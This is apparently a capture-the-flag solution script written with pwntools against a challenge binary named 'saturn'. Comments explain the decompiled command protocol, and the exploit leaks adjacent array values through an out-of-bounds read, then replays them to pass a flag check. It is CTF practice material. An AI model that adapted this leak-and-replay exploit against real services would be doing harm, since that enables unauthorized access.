#!/usr/bin/env python2
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('saturn')

host = args.HOST or '10.67.0.1'
port = int(args.PORT or 31990)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

gdbscript = '''
break *0x{exe.entry:x}
continue
'''.format(**locals())

"""
    v0 = readInput();
    v3 = v0;
    v1 = v0 & 0xF0;
    switch ( v1 )
    {
      case 0xA0:
        sub_804885C(v3);
        i -= 2;
        break;
      case 0xE0:
        sub_80488E8(v3);
        i -= 2;
        break;
      case 0x80:
        sub_8048A01();
        break;
    }
  }
"""


# -- Exploit goes here --

io = start()
io.recvline()

# byte 1 -> switch case
# byte 2 -> value used in function call

cmds = {
        "read": 0xa0,
        "comp": 0xe0,
        "flag": 0x80
}

def read(index):
    assert index <= 0xf

    io.send(chr(cmds["read"] + index))
    return io.recv(4)

def comp(index, value):
    assert index <= 0xf and len(value) == 4

    io.send(chr(cmds["comp"] + index))
    io.send(value)

def flag():
    io.send(chr(cmds["flag"]))

"""
Protocol description
We have two arrays that are next to each other:
    - char firstArray[32]
    - char secondArray[32]

Also, we have an array filled with zeros:
    - int productArray[] -> somewhere (not relevant)

The function that displays the flag does the following check:
    if product(productArray[0:8]) != 0:
        readFlag()
    else:
        exit()

So, we need to get values different form 0 in postions 0,1..7
If we send a 'comp' command, the program does the following operations:
    if read(stdin, 4) == arrayTwo[index]:
        productArray[index] = 1

As we can read 4 chars at a time, I think we can leak the second array

Let's solve
"""

# i just deleted the fancy code and wrote a simpler version
# that reads at index + 8
# and compares at index
for i in range(0, 8):
    value = read(i + 8)
    log.success("Read: " + value)
    comp(i, value)
    log.success("Sent at " + str(i))


flag()
io.interactive()
